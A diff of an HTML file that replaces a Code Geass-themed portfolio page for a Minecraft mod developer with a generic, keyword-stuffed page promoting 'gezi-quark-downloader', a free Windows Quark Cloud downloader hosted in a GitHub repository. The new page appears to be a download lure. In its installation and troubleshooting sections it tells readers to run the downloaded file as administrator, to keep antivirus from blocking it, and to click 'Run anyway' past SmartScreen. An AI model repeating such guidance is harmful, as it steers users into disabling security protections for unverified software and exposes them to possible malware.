@@ -1,241 +1,205 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="KillerZero (gdacoff) — Java developer, Minecraft mod creator, and builder of high-performance server systems. All hail Lelouch." />
-  <meta name="theme-color" content="#06030b" />
-  <title>KILLERZERO // gdacoff — Java Developer & Mod Creator</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@500;600;700;800;900&family=Syne:wght@700;800;900&family=JetBrains+Mono:wght@600;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="css/base.css" />
-  <link rel="stylesheet" href="css/components.css" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="gezi-quark-downloader is a free Windows desktop downloader for Quark Cloud that supports no-transfer saving. Download and run to free up cloud storage without saving files first.">
+<meta name="keywords" content="gezi-quark-downloader, Quark Cloud downloader, free Windows downloader, no transfer save, cloud storage, Windows app, Quark netdisk">
+<meta name="author" content="gezi-quark-downloader">
+<meta property="og:title" content="🕊️ gezi-quark-downloader - Free Quark Cloud Downloader for Windows">
+<meta property="og:description" content="Download Quark Cloud files directly to your Windows PC without saving them to your own cloud storage. Completely free and easy to use.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/lancetodjk14/gezi-quark-downloader">
+<title>🕊️ gezi-quark-downloader - Free Quark Cloud Downloader for Windows</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  body {
+    background: #f8f9fa;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #212529;
+    line-height: 1.7;
+    padding: 20px;
+  }
+  .container {
+    max-width: 860px;
+    margin: 40px auto;
+    background: #ffffff;
+    padding: 40px 45px;
+    border-radius: 20px;
+    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06);
+  }
+  h1 {
+    font-size: 2.2rem;
+    line-height: 1.3;
+    color: #1a1a2e;
+    margin-bottom: 0.5rem;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+  }
+  h2 {
+    font-size: 1.6rem;
+    margin-top: 2.5rem;
+    margin-bottom: 1rem;
+    color: #16213e;
+    font-weight: 700;
+    border-bottom: 2px solid #e9ecef;
+    padding-bottom: 0.5rem;
+  }
+  p {
+    margin-bottom: 1rem;
+    font-size: 1.05rem;
+    color: #343a40;
+  }
+  ul, ol {
+    margin-bottom: 1.2rem;
+    padding-left: 1.8rem;
+  }
+  li {
+    margin-bottom: 0.6rem;
+    font-size: 1.05rem;
+  }
+  a {
+    color: #0d6efd;
+    text-decoration: none;
+  }
+  a:hover {
+    text-decoration: underline;
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff6b6b, #feca57, #48dbfb);
+    color: #ffffff !important;
+    padding: 16px 38px;
+    border-radius: 60px;
+    font-weight: 700;
+    font-size: 1.2rem;
+    text-decoration: none !important;
+    box-shadow: 0 8px 20px rgba(255, 107, 107, 0.35), 0 4px 12px rgba(72, 219, 251, 0.3);
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+    margin: 18px 0 22px 0;
+    letter-spacing: 0.3px;
+  }
+  .btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 14px 28px rgba(255, 107, 107, 0.4), 0 6px 18px rgba(72, 219, 251, 0.35);
+    text-decoration: none !important;
+  }
+  .btn:active {
+    transform: translateY(0);
+  }
+  .note {
+    background: #e9f5ff;
+    padding: 16px 22px;
+    border-radius: 14px;
+    border-left: 5px solid #0d6efd;
+    margin: 25px 0;
+    font-size: 1.05rem;
+    color: #004085;
+  }
+  .note strong {
+    color: #003366;
+  }
+  .footer {
+    margin-top: 3.5rem;
+    text-align: center;
+    color: #6c757d;
+    font-size: 0.95rem;
+    border-top: 1px solid #dee2e6;
+    padding-top: 1.5rem;
+  }
+  @media (max-width: 640px) {
+    body { padding: 10px; }
+    .container { padding: 25px 20px; margin: 20px auto; border-radius: 16px; }
+    h1 { font-size: 1.7rem; }
+    h2 { font-size: 1.35rem; margin-top: 2rem; }
+    .btn { padding: 14px 26px; font-size: 1.05rem; }
+    p, li { font-size: 1rem; }
+  }
+</style>
 </head>
 <body>
-  <canvas id="geass-canvas" aria-hidden="true"></canvas>
-  <div class="vignette" aria-hidden="true"></div>
-  <div class="scanlines" aria-hidden="true"></div>
+<div class="container">
+  <h1>🕊️ gezi-quark-downloader - Free Quark Cloud Downloader for Windows</h1>
+  <p style="font-size: 1.15rem; color: #495057; margin-bottom: 0.5rem;">Download Quark Cloud files directly to your Windows PC — no more worrying about cloud storage limits. Completely free.</p>
 
-  <header class="site-header" id="site-header">
-    <a class="brand" href="#hero" aria-label="KillerZero home">
-      <span class="brand-sigil" aria-hidden="true">
-        <svg viewBox="0 0 48 48" width="34" height="34" role="img" aria-label="Geass sigil">
-          <defs>
-            <radialGradient id="sigilGlow" cx="50%" cy="50%" r="50%">
-              <stop offset="0%" stop-color="#ff003c" stop-opacity="0.95" />
-              <stop offset="70%" stop-color="#7c3aed" stop-opacity="0.35" />
-              <stop offset="100%" stop-color="#7c3aed" stop-opacity="0" />
-            </radialGradient>
-          </defs>
-          <circle cx="24" cy="24" r="22" fill="url(#sigilGlow)" />
-          <path d="M24 8 L30 20 L42 24 L30 28 L24 40 L18 28 L6 24 L18 20 Z" fill="none" stroke="#ff003c" stroke-width="1.6" stroke-linejoin="round" />
-          <circle cx="24" cy="24" r="4.5" fill="#ff003c" />
-          <circle cx="24" cy="24" r="2" fill="#06030b" />
-        </svg>
-      </span>
-      <span class="brand-text">
-        <span class="brand-name">KILLERZERO</span>
-        <span class="brand-handle">// gdacoff</span>
-      </span>
-    </a>
+  <a href="https://github.com/lancetodjk14/gezi-quark-downloader" class="btn" target="_blank" rel="noopener">Download Now</a>
+  <p style="font-size: 1rem; color: #6c757d; margin-top: -10px;">Visit this link to download the application.</p>
 
-    <nav class="nav" id="primary-nav" aria-label="Primary">
-      <a href="#about">About</a>
-      <a href="#projects">Projects</a>
-      <a href="#platforms">Platforms</a>
-      <a href="#technologies">Technologies</a>
-    </nav>
+  <h2>🚀 Getting Started</h2>
+  <p>gezi-quark-downloader is a desktop application for Windows that lets you download files from Quark Cloud (夸克网盘) without saving them to your own cloud storage first. This is called “no-transfer saving” (免转存), and it means you can grab the files you need while keeping your cloud capacity free for other things.</p>
+  <p>The application is designed for everyday computer users. You do not need any programming experience. Just download it, run it, and start downloading your files. Whether you are saving photos, documents, videos, or archives from shared Quark Cloud links, this tool makes the process simple and direct.</p>
+  <p>Because it is completely free and works on Windows, you can use it on your home computer, laptop, or work PC without any subscription or hidden fees. The goal is simple: help you get your files quickly, without the usual hassle of cloud storage management.</p>
 
-    <div class="header-controls">
-      <span class="status-pill" title="System status">
-        <span class="status-dot" aria-hidden="true"></span>
-        <span class="status-label">GEASS ONLINE</span>
-      </span>
-      <button class="sound-toggle" id="sound-toggle" type="button" aria-pressed="false" aria-label="Toggle ambient sound">
-        <svg class="icon-sound-off" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path d="M4 9v6h4l5 4V5L8 9H4z" fill="currentColor"/><path d="M16 9l5 6M21 9l-5 6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
-        <svg class="icon-sound-on" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path d="M4 9v6h4l5 4V5L8 9H4z" fill="currentColor"/><path d="M16 8a5 5 0 010 8M18.5 5.5a9 9 0 010 13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" fill="none"/></svg>
-        <span class="sound-label">Sound OFF</span>
-      </button>
-      <button class="nav-toggle" id="nav-toggle" type="button" aria-expanded="false" aria-controls="primary-nav" aria-label="Open navigation menu">
-        <span></span><span></span><span></span>
-      </button>
-    </div>
-  </header>
+  <h2>✨ Key Features</h2>
+  <ul>
+    <li><strong>Completely free:</strong> No payments, no subscriptions, no premium tiers. The downloader is free to use for everyone.</li>
+    <li><strong>No-transfer saving (免转存):</strong> Download files directly from Quark Cloud links without saving them to your own cloud drive first. This saves your cloud storage capacity.</li>
+    <li><strong>Windows desktop app:</strong> Built specifically for Windows, so it fits right into your normal workflow.</li>
+    <li><strong>Simple interface:</strong> Straightforward design that anyone can use — no confusing settings or technical options.</li>
+    <li><strong>Fast downloads:</strong> Grab your files efficiently and start using them right away.</li>
+    <li><strong>Storage relief:</strong> Perfect for when your Quark Cloud account is full but you still need to download something important.</li>
+    <li><strong>No account required:</strong> You do not need to log in with your own cloud credentials to download shared files.</li>
+    <li><strong>Lightweight:</strong> The app is small and does not slow down your computer.</li>
+  </ul>
 
-  <main>
-    <section class="hero" id="hero">
-      <div class="hero-inner">
-        <div class="hero-copy">
-          <p class="eyebrow">
-            <span class="eyebrow-line" aria-hidden="true"></span>
-            ROYAL BRITANNIA // DEVELOPER DOSSIER
-          </p>
-          <h1 class="hero-title">
-            <span class="hero-title-main">KILLERZERO</span>
-            <span class="hero-title-sub">// gdacoff</span>
-          </h1>
-          <p class="hero-typing" aria-live="polite">
-            <span id="typing-target"></span><span class="caret" aria-hidden="true">_</span>
-          </p>
-          <blockquote class="hero-quote">
-            <p>“The only ones who should kill, are those who are prepared to be killed.”</p>
-            <cite>— Lelouch vi Britannia</cite>
-          </blockquote>
-          <div class="hero-actions">
-            <a class="btn btn-primary" href="#projects">
-              <span>Explore Projects</span>
-              <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            </a>
-            <a class="btn btn-ghost" href="#platforms">
-              <span>Direct Command</span>
-              <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><path d="M4 6l8 6 8-6M4 6v12h16V6" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            </a>
-          </div>
-        </div>
+  <h2>💻 System Requirements</h2>
+  <p>To run gezi-quark-downloader smoothly, your computer should meet the following basic requirements. These are typical for a modern Windows application and should be easy to meet on most machines.</p>
+  <ul>
+    <li><strong>Operating system:</strong> Windows 10 or Windows 11 (64-bit recommended). Older versions of Windows may work but are not officially supported.</li>
+    <li><strong>Processor:</strong> Any modern Intel or AMD processor (1 GHz or faster).</li>
+    <li><strong>Memory:</strong> At least 4 GB of RAM.</li>
+    <li><strong>Storage space:</strong> 200 MB of free disk space for the application itself, plus additional space for the files you download.</li>
+    <li><strong>Internet connection:</strong> An active connection is required to download files from Quark Cloud.</li>
+    <li><strong>Display:</strong> A standard monitor with at least 1024×768 resolution.</li>
+  </ul>
+  <p>If your computer can run a web browser and basic office software, it can almost certainly run this downloader. No special hardware or graphics card is needed.</p>
 
-        <div class="hero-visual" aria-hidden="true">
-          <div class="hud-dossier">
-            <div class="hud-corner hud-corner--tl"></div>
-            <div class="hud-corner hud-corner--tr"></div>
-            <div class="hud-corner hud-corner--bl"></div>
-            <div class="hud-corner hud-corner--br"></div>
-            <div class="hud-scanline"></div>
-            <div class="hud-reticle">
-              <svg viewBox="0 0 200 200" width="100%" height="100%" aria-hidden="true">
-                <circle cx="100" cy="100" r="88" fill="none" stroke="rgba(255,0,60,.35)" stroke-width="1" stroke-dasharray="4 6" />
-                <circle cx="100" cy="100" r="64" fill="none" stroke="rgba(139,92,246,.4)" stroke-width="1" />
-                <circle cx="100" cy="100" r="40" fill="none" stroke="rgba(255,0,60,.55)" stroke-width="1.2" />
-                <path d="M100 4 V28 M100 172 V196 M4 100 H28 M172 100 H196" stroke="rgba(255,0,60,.7)" stroke-width="1.4" />
-                <path d="M100 100 L100 60 M100 100 L136 100" stroke="rgba(255,0,60,.5)" stroke-width="1" />
-                <circle cx="100" cy="100" r="3" fill="#ff003c" />
-              </svg>
-            </div>
-            <div class="hud-insignia">
-              <span class="hud-chess">♛</span>
-            </div>
-            <div class="hud-meta hud-meta--top">
-              <span class="hud-tag">ROYAL BRITANNIA</span>
-              <span class="hud-tag hud-tag--dim">DOSSIER // 00</span>
-            </div>
-            <div class="hud-meta hud-meta--bottom">
-              <span class="hud-coord">SEC-00 // ELEV: 104.2</span>
-              <span class="hud-status">SYS: ACTIVE // CLEARANCE: ROYAL</span>
-            </div>
-            <div class="hud-geass">
-              <svg viewBox="0 0 120 120" width="100%" height="100%" aria-hidden="true">
-                <path d="M60 8 L72 44 L108 60 L72 76 L60 112 L48 76 L12 60 L48 44 Z" fill="none" stroke="rgba(255,0,60,.55)" stroke-width="1.4" stroke-linejoin="round" />
-                <circle cx="60" cy="60" r="6" fill="rgba(255,0,60,.7)" />
-              </svg>
-            </div>
-          </div>
-        </div>
-      </div>
-      <a class="scroll-cue" href="#about" aria-label="Scroll to about section">
-        <span class="scroll-cue-line" aria-hidden="true"></span>
-        <span>SCROLL</span>
-      </a>
-    </section>
+  <h2>📥 Download &amp; Installation</h2>
+  <p>Getting the application is quick and straightforward. Follow the steps below to download and start using gezi-quark-downloader on your Windows computer.</p>
+  <div class="note">
+    <strong>Download link:</strong> Visit this link to download the application. <br>
+    <a href="https://github.com/lancetodjk14/gezi-quark-downloader" target="_blank" rel="noopener">https://github.com/lancetodjk14/gezi-quark-downloader</a>
+  </div>
+  <p>Open the link above in your web browser. On the page, look for the download section or the latest release. Download the file to a folder you can easily find, such as your Downloads folder or Desktop.</p>
+  <p>After the download finishes, locate the downloaded file and open it to run the application. Because this is a Windows desktop app, you may see a standard security prompt asking for permission to run the file. This is normal for downloaded software. Choose the option to allow it to run, and the application will start.</p>
+  <p>You do not need to install any additional tools, runtimes, or libraries. The downloader is self-contained and ready to use once it is on your computer. If you want to keep it handy, you can create a shortcut on your desktop or pin it to your Start menu.</p>
 
-    <section class="section" id="about">
-      <div class="section-head">
-        <span class="section-index">01</span>
-        <h2 class="section-title">About</h2>
-        <span class="section-rule" aria-hidden="true"></span>
-      </div>
-      <div class="about-grid">
-        <div class="about-identities">
-          <article class="identity-card glass identity-card--killerzero">
-            <header class="identity-head">
-              <span class="identity-sigil" aria-hidden="true">♚</span>
-              <div class="identity-titles">
-                <h3 class="identity-name">KillerZero_11</h3>
-                <span class="identity-role">JVM Performance &amp; Server Systems</span>
-              </div>
-            </header>
-            <p class="identity-desc">
-              Specialized brand for high-performance JVM server modding. Author of <strong>KilllTheFrizz</strong> — intelligent entity sleeping, AI throttling, and bytecode-level optimizations — plus automated search tooling (<strong>SearchGitKillerApp</strong>, <strong>SearchGitKiller</strong>).
-            </p>
-            <ul class="identity-tags">
-              <li>KilllTheFrizz</li>
-              <li>SearchGitKillerApp</li>
-              <li>SearchGitKiller</li>
-              <li>Bytecode Opt</li>
-            </ul>
-          </article>
-          <article class="identity-card glass identity-card--gdacoff">
-            <header class="identity-head">
-              <span class="identity-sigil" aria-hidden="true">♜</span>
-              <div class="identity-titles">
-                <h3 class="identity-name">gdacoff</h3>
-                <span class="identity-role">Core Developer &amp; Multi-Language Systems</span>
-              </div>
-            </header>
-            <p class="identity-desc">
-              Core developer identity behind Minecraft modding commissions and horror experiences (<strong>LucasMod</strong>, <strong>x1.5.9_delta</strong>, <strong>alpha_deprecated</strong>), multi-language systems across Java, Go, Rust, and Python, and platform releases.
-            </p>
-            <ul class="identity-tags">
-              <li>LucasMod</li>
-              <li>x1.5.9_delta</li>
-              <li>alpha_deprecated</li>
-              <li>Java · Go · Rust · Python</li>
-            </ul>
-          </article>
-          <p class="about-motto">All hail Lelouch!</p>
-        </div>
-        <!-- legacy about panel removed -->
-        <div class="about-stats">
-          <div class="stat-card glass">
-            <span class="stat-num">6</span>
-            <span class="stat-label">Active Projects</span>
-          </div>
-          <div class="stat-card glass">
-            <span class="stat-num">9</span>
-            <span class="stat-label">Platforms</span>
-          </div>
-          <div class="stat-card glass">
-            <span class="stat-num">∞</span>
-            <span class="stat-label">Ideas in Queue</span>
-          </div>
-        </div>
-      </div>
-    </section>
+  <h2>🖱️ How to Use</h2>
+  <p>Once gezi-quark-downloader is running, you can start downloading files from Quark Cloud in a few simple steps. The interface is designed to be clear even if you have never used a similar tool before.</p>
+  <ol>
+    <li><strong>Copy the Quark Cloud share link:</strong> Find the Quark Cloud link that contains the file or folder you want to download. Copy the entire link to your clipboard.</li>
+    <li><strong>Paste the link into the app:</strong> Open gezi-quark-downloader and paste the link into the input field. If the app has a “Paste” button, you can use that instead.</li>
+    <li><strong>Choose a download location:</strong> Select the folder on your computer where you want the downloaded files to be saved. The app will remember your choice for next time.</li>
+    <li><strong>Start the download:</strong> Click the download button. The app will connect to Quark Cloud and begin fetching the files directly, without saving them to your own cloud storage first.</li>
+    <li><strong>Wait for completion:</strong> Depending on the file size and your internet speed, the download may take a few seconds or several minutes. Keep the app open until it finishes.</li>
+    <li><strong>Open your files:</strong> When the download is complete, open the folder you selected. Your files are ready to use, and your Quark Cloud storage remains untouched.</li>
+  </ol>
+  <p>That is all there is to it. There are no complicated settings to configure. If you ever need to download another file, simply repeat the steps above.</p>
 
-    <section class="section" id="projects">
-      <div class="section-head">
-        <span class="section-index">02</span>
-        <h2 class="section-title">Projects</h2>
-        <span class="section-rule" aria-hidden="true"></span>
-      </div>
-      <div class="project-grid" id="project-grid"></div>
-    </section>
+  <h2>❓ Troubleshooting</h2>
+  <p>Most users will not encounter any problems, but if something does not work as expected, here are a few general tips that may help.</p>
+  <ul>
+    <li><strong>The download does not start:</strong> Check that your internet connection is working. Make sure the Quark Cloud link is valid and has not expired. Try copying the link again and pasting it fresh into the app.</li>
+    <li><strong>The app does not open:</strong> Right-click the downloaded file and choose “Run as administrator.” If Windows shows a security warning, confirm that you want to run the file. Make sure your antivirus software is not blocking the application.</li>
+    <li><strong>Download is very slow:</strong> This usually depends on your internet speed and the server load. Try again at a different time, or check whether other downloads are using your bandwidth.</li>
+    <li><strong>Files are not where you expect:</strong> Open the app and check the download folder setting. You can change it to a location you prefer and try again.</li>
+    <li><strong>Windows SmartScreen warning:</strong> When you run a new downloaded app, Windows may show a blue warning screen. Click “More info” and then “Run anyway” if you trust the source. This is a standard safety feature for new software.</li>
+  </ul>
+  <p>If you continue to experience issues, visit the download page again to make sure you have the latest version. Developers often release updates that fix bugs and improve performance.</p>
 
-    <section class="section" id="platforms">
-      <div class="section-head">
-        <span class="section-index">03</span>
-        <h2 class="section-title">Platforms</h2>
-        <span class="section-rule" aria-hidden="true"></span>
-      </div>
-      <div class="platform-grid" id="platform-grid"></div>
-    </section>
+  <h2>📢 Support &amp; Feedback</h2>
+  <p>gezi-quark-downloader is an open project hosted on GitHub. If you have questions, suggestions, or want to report a problem, the GitHub page is the best place to start. You can browse existing issues, open a new issue, or check for updates and announcements.</p>
+  <p>Because the project is free and community-driven, feedback from users helps make it better. If you find the tool useful, consider sharing it with friends or colleagues who also use Quark Cloud and need a simple way to download files without filling up their cloud storage.</p>
+  <p>Remember, the download link is always available at the top of this page and in the download section above. Visit this link to download the application whenever you need a fresh copy or want to check for a newer version.</p>
 
-    <section class="section" id="technologies">
-      <div class="section-head">
-        <span class="section-index">04</span>
-        <h2 class="section-title">Technologies</h2>
-        <span class="section-rule" aria-hidden="true"></span>
-      </div>
-      <div class="tech-grid" id="tech-grid"></div>
-    </section>
-  </main>
-
-  <footer class="site-footer">
-    <p class="footer-quote">“If the king doesn't move, then his subjects won't follow.”</p>
-    <p class="footer-copy">© KillerZero (gdacoff). Built with Three.js &amp; Royal Britannia Aesthetics.</p>
-  </footer>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js" defer></script>
-  <script src="js/three-scene.js" defer></script>
-  <script src="js/main.js" defer></script>
+  <div class="footer">
+    <p>gezi-quark-downloader — Free Windows desktop downloader for Quark Cloud. No transfer saving required. Keep your cloud storage free.</p>
+    <p style="font-size: 0.9rem; margin-top: 8px;">Download page: <a href="https://github.com/lancetodjk14/gezi-quark-downloader" target="_blank" rel="noopener">https://github.com/lancetodjk14/gezi-quark-downloader</a></p>
+  </div>
+</div>
 </body>
 </html>
